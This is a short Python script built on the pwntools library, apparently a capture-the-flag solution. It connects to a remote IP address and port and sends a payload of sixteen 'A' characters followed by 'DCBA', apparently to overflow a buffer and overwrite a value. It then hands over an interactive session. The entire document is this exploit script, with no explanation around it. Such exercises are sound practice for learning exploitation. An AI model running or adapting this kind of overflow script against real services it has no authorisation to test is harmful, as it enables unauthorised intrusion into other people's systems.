from pwn import *

payload = 'AAAAAAAAAAAAAAAADCBA'

p = remote('52.163.126.205', 33330)
print(p.recv())
p.sendline(payload)
p.interactive()
